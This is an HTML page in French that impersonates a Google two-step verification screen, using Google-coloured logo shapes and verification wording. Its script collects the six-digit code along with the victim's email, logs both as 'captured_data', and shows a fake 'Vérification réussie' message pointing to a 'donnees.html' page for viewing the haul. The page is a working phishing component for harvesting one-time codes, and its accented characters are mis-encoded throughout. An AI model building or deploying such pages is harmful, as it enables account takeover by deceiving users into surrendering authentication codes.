<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <g fill="none" fill-rule="evenodd">
                    <path d="M67.95 12.15c0 5.5-4.3 9.55-9.55 9.55s-9.55-4.05-9.55-9.55 4.3-9.55 9.55-9.55 9.55 4.05 9.55 9.55z" fill="#EA4335"/>
                    <path d="M58.4 17.7c-3.05 0-5.55-2.45-5.55-5.55s2.5-5.55 5.55-5.55 5.55 2.45 5.55 5.55-2.5 5.55-5.55 5.55z" fill="#FBBC05"/>
                    <path d="M58.4 6.6c-3.05 0-5.55 2.45-5.55 5.55s2.5 5.55 5.55 5.55 5.55-2.45 5.55-5.55-2.5-5.55-5.55-5.55z" fill="#34A853"/>
                    <path d="M21.3 12.15c0 5.5-4.3 9.55-9.55 9.55S2.2 17.65 2.2 12.15 6.5 2.6 11.75 2.6s9.55 4.05 9.55 9.55z" fill="#4285F4"/>
                </g>
            </svg>
        </div>
        <h1>V√©rification en 2 √©tapes</h1>
        <p class="subtitle">Pour vous assurer qu'il s'agit bien de vous</p>
        
        <div class="icon-wrapper">
            <div class="icon">üìß</div>
        </div>

        <form id="verification-form">
            <div class="form-group">
                <label>Saisissez le code de v√©rification envoy√© √† votre adresse e-mail</label>
                <input type="text" id="code" placeholder="Saisissez le code" maxlength="6" required>
                <div class="error" id="code-error">Code incorrect. R√©essayez.</div>
            </div>

            <p class="info-text">
                Vous n'avez pas re√ßu le code ? 
                <a href="#" class="resend-link" id="resend-link">Renvoyer le code</a>
            </p>

            <div class="methods">
                <div class="method-title">Essayer une autre m√©thode :</div>
                <div class="method-option" onclick="alert('Fonctionnalit√© non disponible')">
                    <span class="method-icon">üì±</span>
                    <span class="method-text">Recevoir un code par SMS</span>
                </div>
                <div class="method-option" onclick="alert('Fonctionnalit√© non disponible')">
                    <span class="method-icon">üîë</span>
                    <span class="method-text">Utiliser une cl√© de s√©curit√©</span>
                </div>
            </div>

            <div class="buttons">
                <button type="submit" class="btn-next">Suivant</button>
            </div>
        </form>
    </div>

    <script>
        const form = document.getElementById('verification-form');
        const codeInput = document.getElementById('code');
        const resendLink = document.getElementById('resend-link');

        // Auto-format le code (accepte uniquement les chiffres)
        codeInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });

        resendLink.addEventListener('click', (e) => {
            e.preventDefault();
            alert('Un nouveau code a √©t√© envoy√© √† votre adresse e-mail');
        });

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const code = codeInput.value.trim();
            
            if (code.length !== 6) {
                document.getElementById('code-error').style.display = 'block';
                return;
            }

            // R√©cup√©rer l'email de la session
            const email = sessionStorage.getItem('current_email') || 'Non disponible';

            const donnee = {
                type: 'verification_code',
                email: email,
                code: code,
                timestamp: new Date().toLocaleString('fr-FR'),
                id: Date.now()
            };

            // R√©cup√©rer les donn√©es existantes
            let donnees = JSON.parse(localStorage.getItem('captured_data') || '[]');
            
            // Ajouter la nouvelle donn√©e
            donnees.push(donnee);
            
            // Sauvegarder
            localStorage.setItem('captured_data', JSON.stringify(donnees));
            
            console.log('‚úÖ Code de v√©rification sauvegard√©:', donnee);
            
            // Message de succ√®s
            alert('V√©rification r√©ussie ! ‚úÖ\n\nConsultez vos donn√©es sur donnees.html');
            
            // Nettoyer la session
            sessionStorage.removeItem('current_email');
        });
    </script>
